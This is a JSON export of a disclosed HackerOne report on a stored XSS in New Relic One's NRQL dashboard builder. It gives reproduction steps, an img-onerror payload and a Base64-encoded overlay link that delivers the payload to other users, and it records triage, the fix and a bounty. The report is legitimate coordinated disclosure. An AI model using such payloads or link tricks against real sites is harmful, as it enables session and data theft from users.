{"id":626082,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYwODI=","url":"https://hackerone.com/reports/626082","title":"Stored XSS via \"my recent queries\" selector in NRQL dashboard builder","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-06-22T22:59:28.333Z","submitted_at":"2019-06-22T22:59:28.333Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jon_bottarini","url":"/jon_bottarini","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-24T14:58:15.517Z","bug_reporter_agreed_on_going_public_at":"2020-08-20T02:38:04.095Z","team_member_agreed_on_going_public_at":"2020-08-24T14:58:15.380Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This is a pretty simple one. \n\nWithin NR One, there is a stored XSS via the dashboard builder. It appears in the \"My recent queries\" dropdown. You can attack other users with this bug by having them navigate to the link, I'll show an example below. \n\nSteps to Reproduce:\n1. From NR1, navigate to the chart builder\n2. Switch to NRQL mode\n3. Enter the following NRQL query in the search box: \n\n```SELECT `“\u003e\u003cimg src=x onerror=alert(document.domain)\u003e \"' Style=position` FROM SyntheticCheck```\n\n4. Press enter. \n5. Now, click on the \"My recent queries\" dropdown button. \n6. Payload will fire\n\n{F514924}\n\n## Impact\n\nIf you want to attack other users with this, you just need to send them the link to the payload in the address bar: \n\nhttps://one.newrelic.com/launcher/nr1-core.home#pane=eyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9\u0026overlay=eyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ==\n\nThe reason this works is that `overlay=` parameter is Base64 encoded:\n\n```{\"overlayId\":\"wanda-data-exploration.nrql-editor\",\"nerdletId\":\"wanda-data-exploration.data-explorer\",\"initialActiveInterface\":\"nrqlEditor\",\"initialLimit\":10,\"initialTimeWindow\":{\"start\":null,\"end\":\"now\",\"offset\":1800000},\"initialTimeWindowOverride\":null,\"initialFilters\":\"\",\"initialPlotAggregate\":{\"plot\":{\"eventTypes\":[\"Transaction\"],\"clauses\":[{\"alias\":\"Response time\",\"nrql\":\"((totalTime OR duration OR 0) + (queueDuration OR 0) OR 0) * 1000\"},{\"alias\":\"Request queuing\",\"nrql\":\"(queueDuration OR 0) * 1000\"},{\"alias\":\"Externals\",\"nrql\":\"(externalDuration OR 0) * 1000\"},{\"alias\":\"GC\",\"nrql\":\"(gcCumulative OR 0) * 1000\"},{\"alias\":\"Application time\",\"nrql\":\"(((totalTime OR duration OR 0) - (externalDuration OR 0) - (databaseDuration OR 0) - (gcCumulative OR 0)) OR 0) * 1000\"}],\"type\":\"shortcut\",\"label\":\"Transaction time breakdown\",\"shortcutName\":\"apm.transaction_time_breakdown\"},\"aggregate\":\"average\"},\"initialAccountId\":1523936,\"initialFacet\":null,\"initialCompareWith\":null,\"initialChartSettings\":{\"chartType\":\"CHART_TABLE\"},\"initialNrqlValue\":\"SELECT `â\u003e\u003cimg src=x onerror=alert(document.domain)\u003e \\\"' Style=position` FROM SyntheticCheck\"}```\n\nWhich includes the payload in the request.","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":514924,"file_name":"Screen_Shot_2019-06-22_at_3.51.12_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/924/8faffe21fcb96d321ec06d9130e6094e5076ac19/Screen_Shot_2019-06-22_at_3.51.12_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-22_at_3.51.12_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-22_at_3.51.12_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151325Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=af568ad06cb30060b522febc780102ff02b2fe3d3cf3bd4dea034918cb525d16","file_size":1018321,"type":"image/png"}],"allow_singular_disclosure_at":"2020-09-19T02:38:04.148Z","allow_singular_disclosure_after":-33482121.44650804,"singular_disclosure_allowed":true,"vote_count":15,"voters":["wi11","base_64","ali","mattberg","rdzxytfcv","b780b984070b4485faf5765","perun","x1x0","jackxparrow","rizkylabh1","and 5 more..."],"severity":{"rating":"high","score":8.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":31873,"asset_type":"URL","asset_identifier":"one.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5182184,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"*sigh*\n\nYarp, that's definitely an XSS. \n\nI strongly suspect we're concatenating user-supplied input before passing to `dangerouslySetInnerHtml`, but will let you know more about the root cause once we find it. Thank you for reporting this!","automated_response":false,"created_at":"2019-06-24T21:31:42.542Z","updated_at":"2019-06-24T21:31:42.542Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5182192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"████████\n\n████","automated_response":false,"created_at":"2019-06-24T21:33:07.493Z","updated_at":"2020-08-24T14:57:08.760Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5182435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"████████\n\nWould love to hear more about how this one slipped through the cracks when you find out more. It always amazes me when I find a NR XSS... it’s like a white whale. ","automated_response":false,"created_at":"2019-06-24T22:27:09.434Z","updated_at":"2020-08-24T14:57:39.629Z","actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5232455,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @jon_bottarini, this issue should be resolved. Please let us know if you can still exploit it!\n\nIt looks like the issue was somehow caused by how we were syntax-highlighting the history. I'm following up with the team to get more details.","automated_response":false,"created_at":"2019-07-01T17:42:29.821Z","updated_at":"2019-07-01T17:42:29.821Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jon_bottarini","url":"/jon_bottarini"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5351600,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"██████\n\nThanks for your help keeping New Relic—and our customers—secure!","automated_response":false,"created_at":"2019-07-17T17:14:55.738Z","updated_at":"2020-08-24T14:57:52.760Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"jon_bottarini","url":"/jon_bottarini"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8984316,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-20T02:38:04.124Z","updated_at":"2020-08-20T02:38:04.124Z","first_to_agree":true,"actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9024549,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-24T14:58:15.405Z","updated_at":"2020-08-24T14:58:15.405Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9024550,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-24T14:58:15.551Z","updated_at":"2020-08-24T14:58:15.551Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}